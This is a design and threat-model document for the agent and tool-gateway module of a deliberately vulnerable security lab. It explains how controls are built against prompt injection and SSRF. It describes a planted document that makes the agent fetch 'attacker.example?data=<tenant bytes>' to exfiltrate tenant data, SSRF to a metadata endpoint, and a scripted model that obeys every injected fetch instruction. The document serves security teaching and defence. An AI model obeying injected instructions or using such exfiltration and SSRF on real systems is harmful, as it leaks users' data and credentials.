# M2 — Agent & Tool Gateway · threat-model diff

> **BrokenBazaar is a deliberately vulnerable application, published as a security learning resource for security practitioners.** Run it on localhost only.

**Boundaries:** B4 (agent ↔ untrusted content), B5 (agent → tools), B7 1.x/5.1 (runtime identity), B3 (deferred — see D7)
**Baseline:** [`v0-baseline.md`](v0-baseline.md) · **Previous diff:** [`m1-tenancy.md`](m1-tenancy.md)
**Status:** landed before any M2 feature code, per AGENTS.md house rule 1.

The baseline models an intention, scoped to the whole product, derived from spec §8 before code existed. This diff is derived from the baseline **plus the concrete decisions about to be made**, and records the four things v0 could not know: which leaves this module makes reachable with an address, the disposition of every B4/B5 requirement, the new leaves the implementation invents, and a verdict on the assumptions that have now met code.

**On length, because the target has now been wrong twice.** M1's diff targeted 80–150 and came in at 264. This one targeted 120–180 and came in near 280. Two modules, both roughly double, which stops being an overrun and starts being evidence the target is measuring the wrong thing.

The document does two jobs with unrelated cost curves. **§3 is mechanical** — one row per requirement, scaling with how many boundaries the module touches, and compressible. **§1 is open-ended** — it scales with how many genuinely novel decisions the module forces, and M2 forced three inside D1 alone, each load-bearing on whether the module's central claim survives review. Compressing §1 to hit a line count would delete the reasoning that makes the design defensible, which is the opposite of the point.

So: no global target from here. §3 stays tight; §1 is as long as the decisions are hard. Recorded rather than quietly abandoned.

---

## 1. The decisions under test

**D1 — The model is an interface with two implementations; `ScriptedModel` is the default.**

A real LLM in the loop breaks clone-and-run, breaks CI determinism, costs money per `make attack`, and makes finding 03 flaky — the PoC asserts exit 0 on vulnerable, and a model that declines the injection on a given run turns a control-free system into a green build.

**This decision is load-bearing on the module's central claim, so the argument is made here, before the code, rather than in the writeup where it would read as a defence constructed after the fact.** If a scripted model is what makes the injection "work," a reader may reasonably say the PoC proves only that the harness complies.

The answer is `SR-B4-3`: *no security property may depend on the model honouring the marking.* Finding 03's claim is **not** "a model can be tricked" — that is LLM01's premise, not this lab's contribution. The claim is that **the platform turned model compliance into an exfiltration primitive.** Under that framing `ScriptedModel` is not a shortcut, it is the **faithful worst case the control is required to survive**: a model that complies with every injection, every time, which is precisely what a control must assume. Determinism stops being a compromise and becomes the correct adversary model.

The obligation this incurs: the real-model path runs at least once at **n ≥ 20**, logged, outside CI, per the cross-cutting statistical-testing track. Without it, "a real model does this too" is an assertion in a repo whose value is that it does not assert. Recorded as R-M2-1.

**D1a — `ScriptedModel` is a pure function over the assembled context that never reads `Span.Origin`.**

      func (m *ScriptedModel) Next(ctx []Span) Action {
          for _, span := range ctx {
              // span.Origin is deliberately NOT consulted.
              if url, ok := findFetchImperative(span.Text); ok {
                  return Action{Tool: "http_fetch",
                                Args: map[string]string{"url": expand(url, ctx)}}
              }
          }
          return Action{Answer: summarise(ctx)}
      }

That one omitted check **is** SR-B4-3 in code: a model that respected the label would be testing the model's good manners, not the platform's controls. Two properties follow, and both are structural rather than maintained by discipline:

- **Causation.** The action is a function of the context, so a document with no imperative yields `summarise`, not a fetch. Finding 03's claim is that *the document did it*, and the negative case is a one-line test. A hardcoded tool-call sequence was rejected here: it emits the fetch with or without the planted document, so it demonstrates nothing about documents.
- **The same call in both modes.** Because `Origin` is never read, vulnerable and hardened produce an identical `Action`. This is required, not incidental: if the hardened assembler caused the script to decline, the exploit would exit 1 and CI would go green with **the gateway, the allowlist and link-blocking all un-run** — M1 T6's failure shape (the attack dying earlier than the control under test) in a new costume. In hardened mode the script must still *attempt* the fetch and the gate must be what refuses.

Replay fixtures keyed by a context hash were also rejected: the two modes assemble different contexts by design, so they hash differently and need two hand-authored fixtures — which turns same-call-in-both-modes from a structural property into a data file someone maintains, failing silently when a prompt changes and the hash misses.

The architecture this produces, and it is the module's thesis in three lines:

      assembler labels the spans      SR-B4-1, SR-B4-2
      model ignores the labels        SR-B4-3's worst case
      gate uses the labels            link-blocking fires on tenant-derived payload

**The label was never for the model. It is for the gate.** `findFetchImperative` is crude and is not a model — it is an *adversary* model, the always-complies worst case. That gap is what R-M2-1's real-model run exists to cover.

**D1b — the real-model path ships, as an experiment rather than an attack, on its own target and never in CI.**

It is not a PoC and must not live in `attacks/`: a PoC asserts exit 0 / exit 1 against `stdout_contains`, while this asserts nothing and returns a **rate with an interval**. `make measure` runs `app/cmd/measure` (beside the existing `migrate` and `seed`), swapping `ScriptedModel` for `RemoteModel` against any OpenAI-compatible endpoint. `make attack` is untouched, keyless and deterministic; `ci.yml` never calls `measure`, and the target refuses to run with an unset base URL — naming the variable, exit 2 — so a misconfigured run cannot be mistaken for a result.

**Two arms, because one arm measures the wrong thing.** Same document, same user turn, same model and temperature; the only variable is the assembler:

      Arm A   assembleVulnerable()  -> flat string      -> one system message
      Arm B   assembleHardened()    -> []Span, labelled -> separately marked message

The expected shape is `Arm B < Arm A` **and `Arm B > 0`**, and that second inequality is the point. `SR-B4-3` is currently a well-argued assertion; two arms make it a number — *labelling cut compliance from 0.85 to 0.20, and the residual 0.20 is why the gate exists rather than the wrapper.* That is the empirical justification for building a gateway at all, and it is the one M2 claim unreachable from `make attack`. Provider-agnostic (`MODEL_BASE_URL` + `MODEL_NAME`) so a reader reproduces it against a local server for free, or against a hosted model, or both — comparing two models is a better result than either alone.

**Three requirements on the harness, two of which are security defects it would otherwise ship:**

1. **Read `MODEL_API_KEY` only — never `OPENAI_API_KEY` or any vendor-named variable.** A provider-agnostic base URL combined with an ambient vendor key is a credential-leak primitive: point the harness at a third-party or local endpoint and an exported key is sent to it in an `Authorization` header. An explicit variable means the key travels because someone chose this destination for it.
2. **Refuse to attach a key to a non-HTTPS base URL unless the host is loopback.** Fail loudly, name the variable, exit 2. This is `SR-B7-1`'s shape — a decision about the resolved destination rather than a string match — applied to the tooling.
3. **Redaction is shared with the gateway, not written twice.** The run files are the evidence and therefore get committed, so a logged request header puts a bearer token into git history where `.gitignore` cannot reach it. That is **MCP01**, the exact class `SR-B7-5` ships a control for — appearing in the harness that measures the lab rather than in the lab. One `redact` package serves both callers. *Second time a defect class has surfaced in this project's scaffolding before its product: M1 T0 found the toolchain-pin defect in the toolchain of the lab built to teach it.*

**Temperature is a stated, non-zero, recorded parameter.** At temperature 0, n=20 is n=1 run twenty times: greedy decoding returns near-identical output and the confidence interval is theatre. Compliance is a rate over a distribution, so the experiment requires sampling, and `temperature` is written into every trial row beside model, arm and date.

**D1c — results live in a new top-level `experiments/`, and the layout amendment is recorded rather than taken quietly.**

      experiments/
      └── 03-injection-compliance/
          ├── README.md       what is measured, how to re-run, why n=20
          ├── document.json   the frozen planted document, treated like code
          ├── runs/*.jsonl    one row per trial: arm, model, temperature, outcome
          └── RESULTS.md      the table the writeup cites

Rejected: `gateway/data/`, which the repo layout defines as the judge's frozen question sets — putting agent-model compliance runs there would make `gateway/` mean two things. Also rejected: inside `attacks/03-*/`, because `attacks/run.py` discovers findings by glob and would trip over non-PoC files, and because the directory implies a PoC contract this deliberately does not meet (it asserts nothing; it returns a rate).

The directory name carries the contract: **`attacks/` assert, `experiments/` measure.** The code needs no amendment — `app/cmd/measure/` sits beside the existing `migrate` and `seed` — but the top-level directory is new, and the repo layout is a dated artifact like the threat models. It gets a row in the README layout table and a line in §8, not a silent addition.

**D2 — The LLM judge is deferred to M4a. M2's gateway decides deterministically.**

This departs from the implementation plan, which specifies `mechanical allowlist → judge → OPA` for M2. The departure is recorded here rather than taken quietly, and the reason is that **M2 has nothing for a judge to decide.**

The surface problem was CI: with no API key the ported rego hits `judge_unavailable → gate`, so every call routes to human review and CI exercises exactly one branch — the failure branch. Frozen fixtures were the draft answer, until D1c established what hash-keyed fixtures cost: any argument change misses the table, and the fall-through is either brittle CI or a silent fail-closed pass that reads as a control holding.

But the prior question settles it. Trace both findings:

| Finding | Decided by | Judge |
|---|---|---|
| 04 — `http_fetch` to the metadata host | allowlist: not listed → `resolved_address_denied` | never consulted |
| 03 — `http_fetch` to `attacker.example?data=<tenant bytes>` | allowlist: not listed → `egress_not_allowlisted` | never consulted |

The obvious rescue is link-blocking — `SR-B4-12` / `SR-B5-4` / `SR-B7-2`, *denied even when the destination is allowlisted* — which sounds like a semantic question. **D1a already made it structural:** the assembler labelled the span, the label travelled with the data (`SR-B4-4`), and `provenance.derived_from` is a fact the platform owns. A lookup, not a judgment.

Check the tool surface and it is conclusive. `read_document(id)` is decidable by capability plus org scope; `http_fetch(url)` by allowlist plus provenance. **M2 has zero ambiguous calls.**

Shipping the judge anyway costs three things, not merely redundancy:

1. **It breaks 03's evidence.** §7 asserts a specific denial reason. A frozen judge that also denies means two controls say no and the test cannot distinguish them — the exact ambiguity D6's allowlist-before-range ordering was written to remove.
2. **It adds attack surface with no control, no finding and no test behind it.** An LLM judge reading tool-call arguments is attacker-influenceable input in the decision path — B5 1.1 and 1.2 verbatim. See **M2-N5**.
3. **It is a component no test exercises**, which is the "repo rot" risk the plan names and the fastest way to make a reader discount the parts that do work.

What M2's gateway still carries, all of it deterministic and all of it exercised by CI with no key anywhere: structural mediation (`SR-B5-2`, D5), the mechanical allowlist, the provenance check, OPA policy, the audit pre-record with write-time redaction, and fail-closed verified by fault injection. That is the module's thesis intact — **M2's claim was always mediation, never judgment.**

What ports from jev-lab now is the part that was always the real lesson: **enrich-then-evaluate, no `http.send` from Rego, fail-closed defaults, and the structured decision doc with reasons.** What does not port yet is everything judge-shaped — provider thresholds, confidence bands, abstention, `judge_unavailable`. jev-lab's claim to be the seed of this defence holds; it lands in M4a, where installed MCP servers expose arbitrary tools with publisher-supplied descriptions and argument shapes nobody can enumerate. That is the case a judge is for, and it is where jev-lab's measured result (Jev's confidence separates clear from ambiguous; Claude's does not) actually decides something.

**Build 04 first.** It exercises only the tool path and the gate — no assembler, no injection, no model cooperation of any kind — so it is deterministic end to end and proves the gateway before 03 adds the context-assembly variable on top.

**D3 — OPA stays, with an honest M2 policy. The image is pinned by digest.**

The digest argument is unchanged by anything else in this diff: A8.5 claims the artifact installed is the artifact reviewed, pinned by content digest, and a tag can be moved while a digest cannot. Pinning OPA by tag would have the repo contradicting its own stated assumption inside its own stack definition. `docker-compose.yml` is a hardened zone, so this is proposed and human-applied.

**What D2 changed: most of the ported rego no longer has anything to do.** Of jev-lab's 244-line `judge_gate.rego`, the judge-independent logic is roughly `blocked`, `force_allowed`, `default route := "deny"`, the reasons scaffolding and the decision doc — everything else (threshold lookup, abstention bands, confidence, `judge_unavailable`, the provider table) exists to interpret a judge's output. **Strip the judge and ~80% of the rego goes with it.** What is left to evaluate in M2 is four lookups: `allowlisted?(host)`, `provenance.derived_from`, `range_denied?(resolved_ip)`, capability set membership. All decidable in one Go or Python function, which raised the real question — whether OPA still earns its place.

**Three positions were considered:**

| Option | Rejected because |
|---|---|
| Drop OPA until M4a; decide in Python in-process | M4a would have to **migrate a shipped, tested gate into OPA** rather than extend one — a rewrite of a working control, exactly the kind of change that silently drops a rule in translation. And `gateway/policy/` as a hardened zone would protect a directory with no policy in it: the zone exists to protect policy, so AGENTS.md's own zone test ("if subverted, would it remove the ability to detect the subversion?") stops cleanly passing for it. |
| Keep OPA with a stub policy until the judge arrives | That is the first option wearing this one's clothes. A `default deny` plus a comment is no policy; if that is all M2 can honestly ship, the honest decision was to drop OPA. |

**Chosen: OPA stays, and the M2 policy is deliberately small but real.** Allowlist table, denied-range table, the provenance rule (B4 5.1 / SR-B5-4), force-allow/force-block, malformed → deny, default deny, reasons, the decision doc. Tested with `opa test` in CI. Its README states plainly that the judge-shaped majority arrives in M4a — **the architecture is what M2 ships; the content grows into it.**

Two properties make this worth a container and a binary even while the logic is trivial:

1. **The decision stays separable from the executor and independently testable.** Policy can be tested without running the agent, and a policy change is a reviewable data diff, not a recompile. That separability is what `gateway/policy/` being a hardened zone *means* — M2's thesis is mediation, and durable mediation is a decision you can inspect outside the process that acts.
2. **SR-B5-5 requires fail-closed *verified by fault injection*.** OPA as a separate process makes killing it a real fault to inject — the ported subprocess pattern already treats timeout and non-zero exit as fail-closed. A function in-process cannot be fault-injected the same way; you would be simulating failure with a test flag, which is weaker evidence than killing the real dependency.

**Build cost, per M1 T0's "evaluate the build, not just the library" lesson:** CI gains an OPA step (`opa test` on the policy suite), the compose file gains the container, and the gateway image needs `opa` on PATH. Counted here rather than discovered in T5.

**D4 — The gateway writes the audit record; execution is a consequence of the record. Confirmed 2026-10-27.**

`SR-B5-6` has four properties: written **before** execution, durable across a crash, redacted at write time, and *a call with no pre-record does not execute*. The fourth is the strange one — it is not about content or timing but about **causation**: the record's existence is what *permits* the execution. That is not logging, it is a license, and a license must be issued by something with the authority to withhold it. So "who writes the audit record?" is really "who holds the authority to execute?" — an architecture decision wearing a logging costume.

| Option | Rejected because |
|---|---|
| Gateway writes to Postgres | Needs a driver in Python → pip → a trust decision through the dependency gate, to write a log line. The mechanism is not the lesson here (contrast the hand-rolled JWT, where it was). |
| Go writes the record, gateway only decides | "No pre-record, no execution" becomes a property the *executor* enforces about itself — the component being audited attesting to its own audit. The weak version of every control this repo builds; concrete failure: a future fast-path dispatch skips the write, nothing fails, and the trail is quietly missing entries while a green redaction test implies coverage. |
| **Gateway appends JSONL to a shared volume and mints the decision ID only after the write lands** | **Chosen.** Stdlib-only, and the pre-record property stays with the component that already holds the allow/deny authority. |

**The chosen shape, and the ordering that is the control:**

      writePreRecord(...)          // append + fsync; returns only after the write lands
      mint decision_id
      executeTool(...)             // unreachable except after a landed record

The record is not a side effect of execution — execution is a consequence of the record. **Order swapped, control inverted.** Every decision writes a pre-record, allowed or denied, before anything acts; an allow adds a completion record with the same ID (`phase:"post"`, outcome), so the ID is a **correlation key joining pre to post** — the "written before execution and completed after it" of the SR.

**D5 deletes D4's hardest problem rather than solving it.** The JSONL option looked like it left a hole: an external executor presenting a decision ID could fabricate one and execute unmediated, so the ID would need to be unforgeable — HMAC machinery, a shared secret. With tools living *behind* the gateway there is no external executor; write-then-execute is one code path in one process, and the ID demotes itself from auth token to join key. D4 and D5 are one decision seen twice.

**"Durable across a crash" is a claim about fsync, not about writing files.** The OS buffers writes; a crash between append and mint loses exactly the record the SR exists to guarantee. So: fsync before minting the ID, and the cost is stated rather than hidden — one flush per tool call, negligible at lab rates, and lab rates are the rates being modeled. Declaring the crash window a residual would concede the requirement's own text. Single gateway process plus one-line JSONL appends also sidesteps multi-writer interleaving.

**The vulnerable-mode writer — SR-B5-9 ships in both modes, satisfied by two writers.** If the gateway were the only writer, vulnerable mode would be silent (no gateway, no decisions, no records), and T9's detect/miss matrix for finding 03 would have nothing to measure a miss on — *you cannot measure a miss you did not instrument*, M1 T8's lesson verbatim and the reason SR-B2-8 shipped in both modes. So the agent loop logs its own unmediated calls — same schema, `mediated: false`, pre-record before dispatch and a completion record after — to `audit/agent.jsonl` beside the gateway's `audit/gateway.jsonl` on the shared volume. Separate files so the T9 replay snapshots both lengths independently, per M1's collection-window lesson.

Note what this says about the planted bug: **the vulnerability is the missing gate, not the missing telemetry.** The agent honestly records every unmediated call it makes — deliberate twice over, because it is what makes the detection measurement possible, and because it is the realistic shape: a production agent that exfiltrates while its own telemetry shows the calls is far more common than one that exfiltrates invisibly. The writeup's investigation story depends on that distinction.

**D5 — Mediation is structural: the hardened agent binary holds no tool code. Confirmed 2026-10-27.**

`SR-B5-2` says *there is one way to invoke a tool* — mediation is a property of the execution path, not a decorator someone remembers to apply. The failure being guarded against is the decorator pattern: hardened mode adds `if hardened { gateway.Check(call) }` before the existing in-process dispatch. That passes a naive test — the gateway is consulted — and violates the SR **in the hardened build itself**, because the in-process path still exists and a future refactor can route around the check. The lab would be shipping the pattern it teaches against.

**What each binary contains, which is the whole decision:**

      hardened mode:
        agent (Go)      : NO tool code. It holds the loop, the assembler,
                          ScriptedModel. It can ask the gateway; it cannot
                          fetch. There is no http_fetch code in the binary
                          to route around.
        gateway (Python): decide -> write pre-record -> fsync -> mint ID ->
                          executeTool()   <- sequential lines in one function

      vulnerable mode:
        agent (Go)      : in-process NaiveFetcher — no allowlist, follows
                          redirects (B5 4.3). B5 2.1 planted: "a built-in
                          tool bypasses the gateway because it is internal."
        gateway         : not consulted at all

**Mediation is enforced by what code exists where, not by a check that remembers to run.** An attacker who fully controls the agent's *prompt* has no fetch primitive — influencing the agent is not enough; they would need code execution in the agent process.

**The apparent cost — two implementations in two languages — dissolves on inspection.** They are not duplicates. The hardened Python fetcher is the correct implementation (resolve → validate the resolved IP → dial *that IP* with the Host header set); the vulnerable Go one is naive by design. That is the module's established pattern at larger grain — `OrgStore`/`NaiveStore`, `ScriptedModel`/`RemoteModel`: two implementations behind one contract, differing in the control, selected once. Here the contract is the wire shape (tool name + args JSON) and the boundary is a process instead of a function.

**One knock-on, accepted:** T4's plan text stated the SSRF lesson in Go terms. The hardened fetcher is Python, and the lesson transfers intact — `http.client` resolves inside `create_connection` just as Go's `http.Client` re-resolves at dial, so the obvious implementation violates `SR-B5-3` ("the resolved value is what executes") in either language while looking correct. Plan amended.

**Rejected: one Go tools service with the audit record as capability.** Tools in one service; the gateway calls it presenting the decision ID; the service verifies the ID exists in `gateway.jsonl`, mounted **read-only** for every container except the gateway — a direct call from the agent has no valid record and is denied. Mediation enforced at the *data* layer via mount permissions, which Compose can express. Rejected because it contradicts confirmed D4 (three processes, not one code path); it opens an ID-replay hole — an *allowed* decision ID, readable from the audit file, can be re-presented to execute twice, so the executor needs consumed-marking, a third writer, and a third `HARDENED` reader (multiplying M2-N4's split-brain problem); and it is more machinery in the module whose thesis is that mediation is structural, not clever.

**But the rejected shape is the right shape for M4a, recorded now so it is not rediscovered:** MCP tools are genuinely third-party external processes — they *cannot* live inside the gateway. Presenting a decision ID verified against a read-only license store is exactly how you mediate a tool you do not own. M2 rejects the mechanism, not the idea; see §8.

**D5b — where `read_document` executes. Forced by elimination; confirmed 2026-10-27.**

D5's confirmed form ("no tool code in the agent binary") forces this, because the gateway is Python and the documents are in Postgres:

| Option | Fate |
|---|---|
| Gateway reads Postgres directly | Impossible — no stdlib Postgres driver; pip is the house-rule violation D4 already rejected for the same reason |
| Agent executes it, importing `app/store` | Violates D5 — an in-process `read_document` is an unmediated tool path, the planted bug |
| **Gateway executes over HTTP to the API** | **The only remaining shape** |

      agent (no tool code, no DB, no secret)
        -> POST /gate {"tool":"read_document","args":{"id":"..."},
                       "session":{"org":"acme","user":"..."}}
      gateway: policy -> pre-record -> fsync
        -> GET /internal/tools/read_document?id=...&org=acme
           Authorization: Bearer <service secret>
      api: verify secret -> store.ForOrg(pool, acme).Get(id) -> return
      gateway: completion record -> return to agent

**Mediation for `read_document` is the secret, enforced at the auth layer.** The agent can reach the internal route on the bridge network (M2-N1, as conceded) but holds nothing that authenticates to it — neither influence nor prompt control obtains the gateway's env. `http_fetch` keeps D4's literal one-code-path-in-one-process; for `read_document` the pre-record ordering spans two processes, so "one code path" becomes **one causal chain** — the SR's claim (record before execution) holds, and the diff says which tool gets which strength rather than implying both are identical.

**Costs, stated:**
- A new credential and a new internal API route — compose env for both services, hardened zone, human-applied in T6. **Loud-or-absent per SR-B1-3**: unset in hardened mode is refuse-to-start, and M2-N4's mode-agreement check extends to secret presence — the "rule lives in one function" gap now spans two languages, so agreement is checked, not assumed.
- The API grows a route outside the public surface — which is M1's T9 rot finding arriving for real: **the internal route must be declared in the `registerHardened` table as a new `authKind` (service-secret), panicking if undeclared**, or it is exactly the bypass shape SR-B1-1 already fails to catch.

**Rejected: verifying the decision ID against `gateway.jsonl` instead of a secret** (shape B applied to one tool). The agent legitimately receives decision IDs for its own allowed calls, so an *allowed* `read_document` ID is replayable absent consumed-marking — the machinery D5 already rejected. The secret is one credential with no replay surface; the agent never holds it.

**D6 — Both hostile destinations are Compose fixtures reached by name, and the gate evaluates allowlist before range.**

The PoC contract forbids any network call outside the stack, so neither destination in this module is real. Two fixtures:

| Fixture | Role | Finding |
|---|---|---|
| `mock-metadata` | fake cloud metadata endpoint, serves a fake SA credential | 04 |
| `collector` | records every request line and query string; `GET /received` for the PoC to assert against | 03 |

**`collector` is not in the plan's compose reservations** — the comment block lists `gateway`, `agent` and `mock-metadata` for M2, then the M4 fixtures, and no exfil sink anywhere. Finding 03 cannot be written without one: its evidence *is* "the attacker received these bytes," so something has to be the attacker. Added in T6 alongside `mock-metadata`; `docker-compose.yml` is a hardened zone, so both are proposed and human-applied.

Both are addressed by name via `extra_hosts` against a fixed container IP — `metadata.google.internal` and `attacker.example`. One mechanism, two findings, and the URLs read honestly in the writeup instead of as `http://collector:9000/`. Reaching `169.254.169.254` literally needs DNAT inside the container and `NET_ADMIN`; that is a timeboxed spike with the hostname as the decided fallback. GCP addresses its metadata server both ways, so the hostname is the honest address regardless.

**Evaluation order is load-bearing, and it is why this is a decision rather than a detail.** Both fixtures sit on the same bridge network in RFC1918 space. A gate that denied private ranges first would block finding 03 as "private address" — true, but the wrong reason, and an artifact of the lab that would not generalise to an attacker on a public IP. So:

      resolve the host
        → host not on the egress allowlist          → DENY egress_not_allowlisted
        → host allowlisted, resolved IP in a
          denied range (link-local, RFC1918)        → DENY resolved_address_denied

Each finding gets its own distinct denial reason, which §7 asserts on. It also leaves `SR-B7-1`'s "deny by range, never by string match" doing the job it was written for: catching a host that **passed** the allowlist and then resolved somewhere it should not — the redirect and DNS-rebinding case, B7 1.2.

**D7 — B3 is modelled, violated by design, and handed to M3 intact. Confirmed 2026-10-27.**

M2 creates the agent session — the principal B3 is about — so the boundary is crossed by construction and the diff must say how. The disposition vocabulary is load-bearing: **`defer` means the module did not make the leaf reachable** (SR-B4-5: no write-back tool exists, nothing to violate); **`violated by design` means it is reachable, undefended, on purpose, with a named destination.** M2's session makes B3's leaves genuinely reachable — which is the point, because finding 05 needs something to attack.

What M2's session is: created with **every grant in scope** (B3 2.1), authority resolved at creation and never re-derived (B3 1.3/1.4 — demotion or removal mid-session changes nothing), no capability intersection (SR-B3-2). The demonstrable consequence: *"summarize my Q3 document"* needs `read_document`; the session holds `read_document` AND `http_fetch`, because M2 has no per-session scope — **finding 03's unscoped-delegation half, live.** M3's intersection would kill the exfil call at the session-scope leg with no cooperation from the model or the wrapper: the strongest version of the control, and the reason M2 demonstrates both halves of the failure is so M3 can show both halves of the fix.

**What M2 owes B3, and it is exactly one thing:** `acting_for` on the session table and on every audit record. The demotion scenario is undefended but *instrumented* — a record at 14:31 says who the session acted for after the authority justifying it was revoked, so when M3 lands SR-B3-3's per-action re-derivation, the before/after is measurable from records M2 already wrote. Data to fix, not data to invent.

**The one thing the disposition forbids: quiet partial fixes.** `expires_at` is a ten-minute column and time-bounding is SR-B3-4 — but a half-defended boundary muddies finding 05's exploit and the before/after measurement both. If the column ships for hygiene, the disposition says "time-bound shipped for hygiene, NOT enforced as SR-B3-4 constrains." One disposition, stated once, all of it to M3.

**D8 — No Slack pipeline; the plan's line is struck. Confirmed 2026-10-27.**

The implementation plan's Detect line said M2's detections "feed the same Slack alert pipeline." No such pipeline exists — M1 shipped `detections/rule.py` and a replay harness and nothing else. Leaving the sentence would be the plan describing infrastructure that was never built — the same failure shape as M1's dangling `ANSWER-KEY.md` references, caught in the T9 audit. Detection output stays as measured matrices in `detections/README.md`. If a feed is ever wanted, it is a one-evening addition from D4's JSONL audit store and can be proposed then, when there is something to feed.

---

## 2. Baseline leaves this module makes reachable

Abstract in v0; addressed here.

| Leaf | Baseline wording | Address in M2 |
|---|---|---|
| **B4 1.1** | *a document body in the org's own corpus, returned by `read_document`* | The corpus is writable by any member and the seed plants content from outside. The injected document is Org A's own. **→ finding 03** |
| **B4 2.1** | *untrusted content concatenated into the same string as system instructions with no separation* | Vulnerable mode's context assembler. The planted bug: one `fmt.Sprintf` that joins system text and document bodies. |
| **B4 5.1** | *tenant data placed inside a URL targeting an allowlisted host* | `http_fetch` with the document's contents in the query string. The host decision is satisfied; the payload is the exfiltration. **→ finding 03** |
| **B5 2.1** | *a built-in or first-party tool bypasses the gateway because it is "internal"* | Vulnerable mode dispatches tools in-process; the gateway is never consulted. |
| **B5 3.2** | *allow/deny on the tool name alone, ignoring arguments* | Vulnerable mode's mechanical check, where it exists at all. |
| **B5 3.3** | *the decision ignores the data crossing the call* | Shares B4 5.1. One control (`SR-B5-4` / `SR-B7-2` link-blocking) kills both. |
| **B5 4.3** | *TOCTOU — the argument is re-resolved after the decision* | `http_fetch` built the obvious way: Go's `http.Client` resolves again at dial time, so the evaluated target and the executed target are different values. See M2-N3's sibling note in §4. |
| **B7 1.1** | *`http_fetch` to 169.254.169.254 returns service-account credentials* | Against `mock-metadata`. **→ finding 04** |
| **B7 1.2** | *a naive denylist is bypassed — decimal/octal forms, a 302 redirect, DNS rebinding* | The redirect variant is reachable and is what makes 04 more than a string-match demo. |
| **B7 5.1** | *the audit record is written before execution and contains raw payloads* | The gateway's pre-record. **Control, no finding** — MCP01, per the plan. |

**Not reachable in M2**, stated so the next diff does not rediscover it: B4 1.3 and B4 1.6 (MCP output, skill references — M4), B4 3.2/3.3 (persistence laundering — no write-back tool in M2), B5 5.2 (publisher-side aggregation — M4a), B3 4.2 and B8 (policy-plane mutation — M3).

---

## 3. Disposition of the B4, B5 and B3 security requirements

`ship` = both modes. `HARDENED` = behind the flag; the vulnerable path violates it on purpose. `defer` = not in M2, with a destination.

| SR | Disposition | Note |
|---|---|---|
| SR-B4-1 provenance tracked structurally, label outside the span | **HARDENED** | A `Span{Origin, Text}` type; the assembler never receives a bare string. Vulnerable mode concatenates (B4 2.1). |
| SR-B4-2 untrusted content in a channel the model cannot confuse with instruction | **HARDENED** | Separate structured message, per-request nonce where framing is unavoidable. |
| SR-B4-3 no security property depends on the model honouring the marking | **HARDENED** | The keystone, and D1's whole justification. Every control below holds with a model that ignores the wrapper entirely. |
| SR-B4-4 classification monotonic and sticky | **HARDENED** | Derived content inherits the lowest trust of its inputs. |
| SR-B4-5 persistence preserves provenance | **defer → M4** | No write-back tool exists in M2; nothing can launder through storage yet. |
| SR-B4-6 compaction preserves labels | **defer → M3** | No compaction step in M2's loop. |
| SR-B4-7 tool output untrusted by default | **HARDENED** | Includes first-party tools. `http_fetch` results are data, never instruction. |
| SR-B4-8 metadata ingested through the same labelled path | **HARDENED** | Headers, content-type, redirect targets. No short-string exemption. |
| SR-B4-9 answers disclose sources and classes | **ship** | Cheap, and it is the only B4 `observe` requirement reachable now. |
| SR-B4-10 untrusted content cannot influence selection | **defer → M4b** | No skill index and no tool choice worth influencing until the catalog exists. |
| SR-B4-11 untrusted content cannot create a durable instruction | **defer → M3** | Sessions do not persist across runs in M2. |
| SR-B4-12 allowlisting is a host decision, never a payload decision | **HARDENED** | Link-blocking. Shares SR-B7-2, SR-B5-4. |
| SR-B4-13 model-composed URLs not auto-fetched by the client | **ship** | The interface is curl; no client renders links. Recorded as satisfied by the absence of a frontend, which is not the same as solved — M4's htmx surface reopens it. |
| SR-B4-14 every ingestion logged with origin and class | **ship** | Both modes. Detection in T9 is meaningless if the vulnerable mode is silent. |
| SR-B5-1 decision derives only from platform-owned state | **HARDENED** | Needs a distinction the baseline does not draw — see **M2-N3**. |
| SR-B5-2 every tool call mediated, no privileged bypass | **HARDENED** | D5: the hardened agent binary holds no tool code — mediation is what code exists where, not a check that remembers to run. The module's thesis. |
| SR-B5-3 per call, on fully-resolved arguments, and the resolved value executes | **HARDENED** | Resolve → validate the resolved IP → dial *that IP* with the Host header set. The obvious implementation violates this while looking correct. |
| SR-B5-4 the decision considers the data crossing the call | **HARDENED** | Link-blocking on tenant-derived content. |
| SR-B5-5 the gate fails closed, verified by fault injection | **HARDENED** | Verified by killing the gateway in CI, not by reading the rego. The SR says *verified*. |
| SR-B5-6 audit written before execution, durable, redacted at write time | **HARDENED** | D4: JSONL pre-record, fsync before the ID is minted, completion record after — execution is unreachable except after a landed record. Redaction is MCP01's control; see **M2-N2** for why it is weaker than it looks. |
| SR-B5-7 capability bounded in volume and rate per session | **defer → M3** | Needs a session capability set, which is M3's object. |
| SR-B5-8 per-installation identity on publisher calls | **defer → M4a** | No publisher exists. |
| SR-B5-9 every decision logged with inputs and outcome | **ship** | Both modes, via **two writers** (D4): the gateway logs decisions, the agent loop logs its own unmediated calls (`mediated: false`). First module with a real signal source for detection rather than only denials — and the vulnerable mode is not silent, so a miss is measurable. |
| SR-B3-1 … SR-B3-8 | **violated by design → M3** | D7. The agent carries the user's full authority, sessions are created with every grant in scope, authority is resolved at creation and never re-derived. Reachable and undefended on purpose — finding 05 needs something to attack. R-M2-4. |
| SR-B3-9 every action records actor (session), acting-for (user), authority relied on | **ship** | Served by D4's audit store: every record in both files carries `session`, `acting_for`, `route`, `reasons` — agent-initiated actions are distinguishable from human ones by construction. The *enforcement* SRs are violated by design; the *attribution* one ships, because D4 was writing those fields anyway. |
| SR-B7-1 egress allowlist on the resolved address, re-evaluated per redirect | **HARDENED** | Kills finding 04. |
| SR-B7-2 outbound requests carrying tenant data denied | **HARDENED** | Shares SR-B4-12 / SR-B5-4. |
| SR-B7-5 secrets redacted at audit write time | **HARDENED** | MCP01. Control, regression test, no finding. |
| SR-B7-6 denied egress and metadata hits are high-signal events | **ship** | T9's input. |
| SR-B7-7 denied fetches return a uniform response | **HARDENED** | Same indistinguishability argument as SR-B2-5, one boundary over. |
| SR-B7-3 per-component service identity, least privilege | **defer → M5** | A requirement on the real deployment's cloud identity. M2's `mock-metadata` serves a *fake* credential, so the leaf is not reachable in the lab — `defer`, not `violated`. The real SA story is M5's B7 module. |
| SR-B7-4 runtime credentials short-lived and audience-bound | **defer → M5** | Same: nothing in M2 holds a real runtime credential. Recorded here so the boundary's seven requirements are all disposed of — the first version of this table dropped these two rows silently, which is precisely how an SR dies. |

---

## 4. New leaves the implementation invents

### M2-N1 — Mediation is a property of the deployment, not only of the code

